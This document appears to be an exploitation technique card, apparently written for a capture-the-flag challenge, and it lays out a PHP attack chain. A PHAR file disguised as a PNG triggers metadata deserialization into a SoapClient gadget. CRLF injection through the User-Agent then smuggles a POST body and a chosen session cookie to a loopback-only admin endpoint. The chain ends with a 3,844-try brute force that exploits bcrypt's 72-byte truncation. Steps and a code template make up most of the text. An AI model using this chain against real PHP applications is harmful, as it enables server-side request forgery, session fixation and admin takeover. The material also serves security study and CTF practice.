---
name: phar_soapclient_crlf_bcrypt_72byte_truncation
vuln_type: deserialization
sub_technique: phar_soapclient_crlf
category: exploitation
safety_level: destructive
tags:
- phar
- soapclient
- crlf
- ssrf-loopback
- bcrypt
- auth-bypass
- php
---

# Phar Metadata Soapclient Gadget + Crlf User-Agent Injection + Bcrypt 72-Byte Truncation Brute

## When to Apply

The application calls file_exists() or file_get_contents() on a user-controlled path that accepts phar:// wrapper. PHAR metadata deserialization triggers a SoapClient gadget chain. The admin verification uses password_verify() on a bcrypt hash of `str_repeat('B',70).KEY` — bcrypt only compares the first 72 bytes, so only KEY[0:2] needs brute-forcing (3844 attempts).

## Prerequisites

- phar:// wrapper reachable via file_exists/file_get_contents on user input
- PHP 7.4 with SoapClient available (not disabled in php.ini)
- Admin elevation endpoint restricted to 127.0.0.1 with password_verify check
- bcrypt PASSWORD_BCRYPT with known prefix (B*70)
- File upload endpoint accepting PNG

## Steps

1. Build PNG-stub PHAR with serialized ImageModel wrapping SoapClient.
2. Set SoapClient._user_agent to CRLF-smuggled POST body + `Cookie: PHPSESSID=<chosen_sid>`.
3. Upload the PHAR as PNG.
4. Trigger deserialization: `/?path=/view&img=phar://<uploaded>/x.txt`.
5. SoapClient fires HTTP to `http://127.0.0.1/?path=/admin` with `VerifyToken=B*70+c1+c2` in POST body.
6. Brute-force c1,c2 over [A-Za-z0-9] (3844 combos) until the target PHPSESSID gains admin=true.
7. Read `/flag` using that session.

## Code Template

```
stub = base64.b64decode(PNG_1x1) + b'<?php __HALT_COMPILER(); ?>\r\n'
meta = serialize(ImageModel(file=SoapClient(location='http://127.0.0.1/?path=/admin',
                                            _user_agent=crlf_payload)))
phar = build_phar(stub, meta, 'x.txt', b'x')
upload(session, phar)
trigger(session, f'phar://{filename}/x.txt')
# poll /?path=/flag with PHPSESSID=chosen_sid
```

## Examples

### Example 1

- **php_version**: 7.4.27
- **key_charset**: [A-Za-z0-9]
- **brute_space**: 62*62 = 3844
- **gadget**: ImageModel -> SoapClient.__call() -> HTTP request

The bcrypt 72-byte limit is the critical insight. The full KEY is 100 bytes but only the first 2 characters matter for password_verify. Cookie injection via User-Agent CRLF allows session fixation on the target PHPSESSID.
